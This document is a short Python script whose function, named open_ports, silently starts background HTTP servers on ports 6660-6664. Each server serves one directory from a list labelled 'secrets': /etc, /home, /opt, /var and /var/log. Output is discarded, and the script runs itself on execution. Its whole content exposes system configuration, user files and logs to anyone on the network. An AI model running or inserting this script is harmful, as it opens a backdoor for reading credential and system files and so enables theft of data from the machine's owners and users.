#!/usr/bin/env python3

import os

def open_ports():
    secrets = {
        0:"/etc/",
        1:"/home/",
        2:"/opt/",
        3:"/var/",
        4:"/var/log/"
    }

    for number in range(5):
        directory = secrets.get(number)
        cmd = "python3 -m http.server 666%d > /dev/null &" % number
        os.chdir(directory)
        os.system(cmd)

open_ports()

